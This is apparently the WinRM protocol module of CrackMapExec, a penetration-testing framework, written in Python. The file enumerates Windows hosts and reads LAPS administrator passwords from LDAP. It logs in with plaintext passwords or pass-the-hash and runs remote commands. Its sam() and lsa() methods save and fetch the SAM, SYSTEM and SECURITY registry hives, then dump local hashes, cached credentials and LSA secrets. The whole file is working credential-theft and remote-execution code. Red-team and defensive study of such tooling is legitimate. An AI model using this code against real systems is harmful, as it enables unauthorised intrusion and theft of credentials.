#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import binascii
import hashlib
import os
import requests

from io import StringIO
from datetime import datetime
from pypsrp.client import Client

from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes

from cme.config import process_secret
from cme.connection import *
from cme.helpers.bloodhound import add_user_bh
from cme.protocols.ldap.laps import LDAPConnect, LAPSv2Extract
from cme.logger import CMEAdapter

class winrm(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.output_filename = None
        self.endpoint = None
        self.port = None
        self.hash = None
        self.lmhash = None
        self.nthash = None

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = CMEAdapter(
            extra={
                "protocol": "WINRM",
                "host": self.host,
                "port": self.args.port if self.args.port else 5985,
                "hostname": self.hostname,
            }
        )

    def enum_host_info(self):
        # smb no open, specify the domain
        if self.args.no_smb:
            self.domain = self.args.domain
        else:
            # try:
            smb_conn = SMBConnection(self.host, self.host, None, timeout=5)
            no_ntlm = False
            try:
                smb_conn.login("", "")
            except BrokenPipeError:
                self.logger.fail(f"Broken Pipe Error while attempting to login")
            except Exception as e:
                if "STATUS_NOT_SUPPORTED" in str(e):
                    # no ntlm supported
                    no_ntlm = True
                pass

            self.domain = smb_conn.getServerDNSDomainName() if not no_ntlm else self.args.domain
            self.hostname = smb_conn.getServerName() if not no_ntlm else self.host
            self.server_os = smb_conn.getServerOS()
            if isinstance(self.server_os.lower(), bytes):
                self.server_os = self.server_os.decode("utf-8")

            self.logger.extra["hostname"] = self.hostname

            self.output_filename = os.path.expanduser(f"~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}")

            try:
                smb_conn.logoff()
            except:
                pass
            # except Exception as e:
            #     self.logger.fail(
            #         f"Error retrieving host domain: {e} specify one manually with the '-d' flag"
            #     )

            if self.args.domain:
                self.domain = self.args.domain

            if self.args.local_auth:
                self.domain = self.hostname

            if self.server_os is None:
                self.server_os = ""
            if self.domain is None:
                self.domain = ""

            self.db.add_host(self.host, self.port, self.hostname, self.domain, self.server_os)

        self.output_filename = os.path.expanduser(f"~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))

    def laps_search(self, username, password, ntlm_hash, domain):
        ldapco = LDAPConnect(self.domain, "389", self.domain)

        if self.kerberos:
            if self.kdcHost is None:
                self.logger.fail("Add --kdcHost parameter to use laps with kerberos")
                return False

            connection = ldapco.kerberos_login(
                domain,
                username[0] if username else "",
                password[0] if password else "",
                ntlm_hash[0] if ntlm_hash else "",
                kdcHost=self.kdcHost,
                aesKey=self.aesKey,
            )
        else:
            connection = ldapco.auth_login(
                domain,
                username[0] if username else "",
                password[0] if password else "",
                ntlm_hash[0] if ntlm_hash else "",
            )
        if not connection:
            self.logger.fail("LDAP connection failed with account {}".format(username[0]))
            return False

        search_filter = "(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(name=" + self.hostname + "))"
        attributes = [
            "msLAPS-EncryptedPassword",
            "msLAPS-Password",
            "ms-MCS-AdmPwd",
            "sAMAccountName",
        ]
        results = connection.search(searchFilter=search_filter, attributes=attributes, sizeLimit=0)

        msMCSAdmPwd = ""
        sAMAccountName = ""
        username_laps = ""

        from impacket.ldap import ldapasn1 as ldapasn1_impacket

        results = [r for r in results if isinstance(r, ldapasn1_impacket.SearchResultEntry)]
        if len(results) != 0:
            for host in results:
                values = {str(attr["type"]).lower(): attr["vals"][0] for attr in host["attributes"]}
                if "mslaps-encryptedpassword" in values:
                    from json import loads
                    msMCSAdmPwd = values["mslaps-encryptedpassword"]
                    d = LAPSv2Extract(
                        bytes(msMCSAdmPwd),
                        username[0] if username else "",
                        password[0] if password else "",
                        domain,
                        ntlm_hash[0] if ntlm_hash else "",
                        self.args.kerberos,
                        self.args.kdcHost,
                        339)
                    data = d.run()
                    r = loads(data)
                    msMCSAdmPwd = r["p"]
                    username_laps = r["n"]
                elif "mslaps-password" in values:
                    from json import loads
                    r = loads(str(values["mslaps-password"]))
                    msMCSAdmPwd = r["p"]
                    username_laps = r["n"]
                elif "ms-mcs-admpwd" in values:
                    msMCSAdmPwd = str(values["ms-mcs-admpwd"])
                else:
                    self.logger.fail("No result found with attribute ms-MCS-AdmPwd or" " msLAPS-Password")
            self.logger.debug("Host: {:<20} Password: {} {}".format(sAMAccountName, msMCSAdmPwd, self.hostname))
        else:
            self.logger.fail("msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS" " property for {}".format(self.hostname))
            return False

        self.username = self.args.laps if not username_laps else username_laps
        self.password = msMCSAdmPwd

        if msMCSAdmPwd == "":
            self.logger.fail("msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS" " property for {}".format(self.hostname))
            return False
        if ntlm_hash:
            hash_ntlm = hashlib.new("md4", msMCSAdmPwd.encode("utf-16le")).digest()
            self.hash = binascii.hexlify(hash_ntlm).decode()

        self.domain = self.hostname
        return True

    def print_host_info(self):
        if self.args.domain:
            self.logger.extra["protocol"] = "HTTP"
            self.logger.display(self.endpoint)
        else:
            self.logger.extra["protocol"] = "SMB"
            self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain})")
            self.logger.extra["protocol"] = "HTTP"
            self.logger.display(self.endpoint)

        if self.args.laps:
            return self.laps_search(self.args.username, self.args.password, self.args.hash, self.domain)
        return True

    def create_conn_obj(self):
        endpoints = [
            f"https://{self.host}:{self.args.port if self.args.port else 5986}/wsman",
            f"http://{self.host}:{self.args.port if self.args.port else 5985}/wsman",
        ]

        for url in endpoints:
            try:
                self.logger.debug(f"winrm create_conn_obj() - Requesting URL: {url}")
                res = requests.post(url, verify=False, timeout=self.args.http_timeout)
                self.logger.debug("winrm create_conn_obj() - Received response code:" f" {res.status_code}")
                self.endpoint = url
                if self.endpoint.startswith("https://"):
                    self.logger.extra["port"] = self.args.port if self.args.port else 5986
                else:
                    self.logger.extra["port"] = self.args.port if self.args.port else 5985
                return True
            except requests.exceptions.Timeout as e:
                self.logger.info(f"Connection Timed out to WinRM service: {e}")
            except requests.exceptions.ConnectionError as e:
                if "Max retries exceeded with url" in str(e):
                    self.logger.info(f"Connection Timeout to WinRM service (max retries exceeded)")
                else:
                    self.logger.info(f"Other ConnectionError to WinRM service: {e}")
        return False

    def plaintext_login(self, domain, username, password):
        try:
            from urllib3.connectionpool import log

            # log.addFilter(SuppressFilter())
            if not self.args.laps:
                self.password = password
                self.username = username
            self.domain = domain
            if self.args.ssl and self.args.ignore_ssl_cert:
                self.conn = Client(
                    self.host,
                    auth="ntlm",
                    username=f"{domain}\\{self.username}",
                    password=self.password,
                    ssl=True,
                    cert_validation=False,
                )
            elif self.args.ssl:
                self.conn = Client(
                    self.host,
                    auth="ntlm",
                    username=f"{domain}\\{self.username}",
                    password=self.password,
                    ssl=True,
                )
            else:
                self.conn = Client(
                    self.host,
                    auth="ntlm",
                    username=f"{domain}\\{self.username}",
                    password=self.password,
                    ssl=False,
                )

            # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
            # we could just authenticate without running a command :) (probably)
            self.conn.execute_ps("hostname")
            self.admin_privs = True
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
            self.db.add_credential("plaintext", domain, self.username, self.password)
            # TODO: when we can easily get the host_id via RETURNING statements, readd this in
            # host_id = self.db.get_hosts(self.host)[0].id
            # self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.logger.debug(f"Inside admin privs")
                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host)  # , user_id=user_id)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True
        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()} '{e}'")

            return False

    def hash_login(self, domain, username, ntlm_hash):
        try:
            # from urllib3.connectionpool import log

            # log.addFilter(SuppressFilter())
            lmhash = "00000000000000000000000000000000:"
            nthash = ""

            if not self.args.laps:
                self.username = username
                # This checks to see if we didn't provide the LM Hash
                if ntlm_hash.find(":") != -1:
                    lmhash, nthash = ntlm_hash.split(":")
                else:
                    nthash = ntlm_hash
                    ntlm_hash = lmhash + nthash
                if lmhash:
                    self.lmhash = lmhash
                if nthash:
                    self.nthash = nthash
            else:
                nthash = self.hash

            self.domain = domain
            if self.args.ssl and self.args.ignore_ssl_cert:
                self.conn = Client(
                    self.host,
                    auth="ntlm",
                    username=f"{self.domain}\\{self.username}",
                    password=lmhash + nthash,
                    ssl=True,
                    cert_validation=False,
                )
            elif self.args.ssl:
                self.conn = Client(
                    self.host,
                    auth="ntlm",
                    username=f"{self.domain}\\{self.username}",
                    password=lmhash + nthash,
                    ssl=True,
                )
            else:
                self.conn = Client(
                    self.host,
                    auth="ntlm",
                    username=f"{self.domain}\\{self.username}",
                    password=lmhash + nthash,
                    ssl=False,
                )

            # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
            # we could just authenticate without running a command :) (probably)
            self.conn.execute_ps("hostname")
            self.admin_privs = True
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}")
            self.db.add_credential("hash", domain, self.username, nthash)

            if self.admin_privs:
                self.db.add_admin_user("hash", domain, self.username, nthash, self.host)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(nthash)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(nthash)} '{e}'")
            return False

    def execute(self, payload=None, get_output=False):
        try:
            r = self.conn.execute_cmd(self.args.execute, encoding=self.args.codec)
        except:
            self.logger.info("Cannot execute command, probably because user is not local admin, but" " powershell command should be ok!")
            r = self.conn.execute_ps(self.args.execute)
        self.logger.success("Executed command")
        buf = StringIO(r[0]).readlines()
        for line in buf:
            self.logger.highlight(line.strip())


    def ps_execute(self, payload=None, get_output=False):
        r = self.conn.execute_ps(self.args.ps_execute)
        self.logger.success("Executed command")
        buf = StringIO(r[0]).readlines()
        for line in buf:
            self.logger.highlight(line.strip())

    def sam(self):
        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM" " C:\\windows\\temp\\SYSTEM")
        self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
        self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
        self.conn.execute_cmd("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM")

        local_operations = LocalOperations(f"{self.output_filename}.system")
        boot_key = local_operations.getBootKey()
        SAM = SAMHashes(
            f"{self.output_filename}.sam",
            boot_key,
            isRemote=None,
            perSecretCallback=lambda secret: self.logger.highlight(secret),
        )
        SAM.dump()
        SAM.export(f"{self.output_filename}.sam")

    def lsa(self):
        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM" " C:\\windows\\temp\\SYSTEM")
        self.conn.fetch("C:\\windows\\temp\\SECURITY", f"{self.output_filename}.security")
        self.conn.fetch("C:\\windows\\temp\\SYSTEM", f"{self.output_filename}.system")
        self.conn.execute_cmd("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY")

        local_operations = LocalOperations(f"{self.output_filename}.system")
        boot_key = local_operations.getBootKey()
        LSA = LSASecrets(
            f"{self.output_filename}.security",
            boot_key,
            None,
            isRemote=None,
            perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
        )
        LSA.dumpCachedHashes()
        LSA.dumpSecrets()
